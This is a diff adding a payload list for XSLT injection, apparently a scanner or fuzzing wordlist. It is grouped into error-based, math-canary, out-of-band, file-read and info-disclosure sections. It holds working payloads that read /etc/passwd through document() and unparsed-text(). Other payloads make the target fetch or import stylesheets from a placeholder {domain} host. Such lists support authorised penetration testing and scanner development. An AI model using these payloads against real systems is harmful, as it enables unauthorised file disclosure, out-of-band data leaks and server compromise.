@@ -1,0 +1,34 @@
+##XSLT Injection - Error-Based##
+<xsl:invalid/>
+<xsl:value-of select="unknown_function()"/>
+<xsl:value-of select="///"/>
+<xsl:value-of select="[invalid xpath"/>
+<xsl:value-of select="concat("/>
+<xsl:template match="###"/>
+<xsl:for-each select="$nonexistent"/>
+
+##XSLT Injection - Math-Based (Canary: 1337)##
+<xsl:value-of select="7*191"/>
+<xsl:value-of select="1337"/>
+<xsl:value-of select="string(7*191)"/>
+<xsl:value-of select="2674 div 2"/>
+<xsl:value-of select="1338 - 1"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><result><xsl:value-of select="7*191"/></result></xsl:template></xsl:stylesheet>
+
+##XSLT Injection - OOB##
+<xsl:value-of select="document('http://{domain}/xslt')"/>
+<xsl:copy-of select="document('http://{domain}/xslt')"/>
+<xsl:include href="http://{domain}/xslt.xsl"/>
+<xsl:import href="http://{domain}/xslt.xsl"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('http://{domain}/xslt')"/></xsl:template></xsl:stylesheet>
+
+##XSLT Injection - File Read##
+<xsl:value-of select="document('/etc/passwd')"/>
+<xsl:copy-of select="document('/etc/passwd')"/>
+<xsl:value-of select="unparsed-text('/etc/passwd')"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+
+##XSLT Injection - Info Disclosure##
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:value-of select="system-property('xsl:version')"/>
+<xsl:value-of select="system-property('xsl:vendor-url')"/>
